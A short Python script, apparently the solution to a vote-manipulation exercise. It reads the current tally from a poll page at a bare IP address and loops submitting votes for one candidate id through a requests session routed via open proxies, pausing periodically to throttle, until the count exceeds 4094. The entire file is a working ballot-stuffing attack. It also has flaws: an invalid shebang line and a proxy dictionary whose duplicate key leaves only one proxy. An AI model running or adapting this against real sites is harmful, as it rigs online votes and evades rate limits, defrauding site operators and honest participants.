#!/bin/bash/python3
""" """
import requests
import time
import re
from robobrowser import RoboBrowser

from bs4 import BeautifulSoup
count = 0
ini = ''
votes = 0
tmp = 0
url = 'http://158.69.76.135/level1.php'

session = requests.Session()
session.proxies = {'http': '91.214.70.99:3128',
                    'http': '159.203.118.239:8080',}

while votes <= 4094:
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    text = str(soup.findAll('tr')[58])
    for i in range(len(text)):
        if text[i].isdigit() and count > 0:
            ini += str(text[i])
        if text[i].isdigit() and text[i+1].isspace() and count == 0:
            count += 1
        elif text[i].isdigit() and text[i+1].isspace() and count > 0:
            break
    votes = int(ini)
    print(votes)
    ini = ''
    count = 0
    br = RoboBrowser(history=True, session=session)
    br.open(url)
    form = br.get_form()
    form['id'].value = 733
    br.submit_form(form)
    tmp += 1
    if tmp == 30:
        time.sleep(1)
        tmp = 0
print("Finish! {} votes".format(votes+1))
